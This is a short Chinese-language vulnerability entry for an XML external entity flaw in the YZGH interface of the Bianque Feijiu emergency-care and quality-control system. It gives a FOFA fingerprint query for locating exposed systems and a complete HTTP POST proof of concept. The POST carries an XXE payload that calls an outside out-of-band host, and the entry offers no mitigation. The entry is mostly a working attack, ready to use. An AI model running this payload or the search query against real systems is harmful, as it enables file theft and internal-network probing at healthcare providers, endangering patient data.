## 扁鹊飞救智能急救与质控系统 YZGH XML实体注入漏洞

## 漏洞描述
扁鹊飞救智能急救与质控系统 `YZGH` 接口解析 XML 时未禁用外部实体，攻击者可通过 XXE 读取服务器文件或内网探测。

## 网络空间测绘
```
fofa: icon_hash="-757866684" || icon_hash="-1206146847"
```

## POC
```
POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/YZGH HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

requestXml1=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ntzeacgakc.yutu.eu.org">
  %remote;
]>
<root/>
```

## 参考
- 社区情报

